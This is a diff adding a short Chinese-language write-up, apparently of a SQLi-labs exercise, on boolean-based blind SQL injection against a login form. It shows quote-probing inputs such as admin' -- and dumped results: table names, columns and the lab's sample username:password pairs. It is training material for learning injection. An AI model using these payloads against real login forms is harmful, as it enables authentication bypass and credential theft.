@@ -1,0 +1,22 @@
+uname='admin&passwd=123&submit=Submit
+仅显示slap.jpg图片
+uname="admin&passwd=123&submit=Submit
+仅显示slap.jpg图片
+uname=admin&passwd=admin&submit=Submit
+显示flag.jpg
+即错误时，不返回错误，只返回错误的图片，正确时，返回正确的图片，故采用基于布尔值的盲注
+
+判断sql：
+推测1：select 字段名 from 表名 where uname = "输入" and passwd = "输入"
+uname=admin"-- &passwd=admin&submit=Submit显示slap.jpg，说明推测1不正确
+推测2：select 字段名 from 表名 where uname = '输入' and passwd = '输入'
+uname=admin'-- &passwd=admin&submit=Submit显示flag.jpg，说明推测2正确
+故sql：select 字段名 from 表 where uname = '输入的uname' and passwd = '输入的passwd';
+
+编写脚本（脚本与Less-13基本相同）
+表名：
+result: users,uagents,emails,referers
+字段名：
+result: id,username,password,user,current_connections,total_connections
+字段值：
+result: dumb:dumb,angelina:i-kill-you,dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4
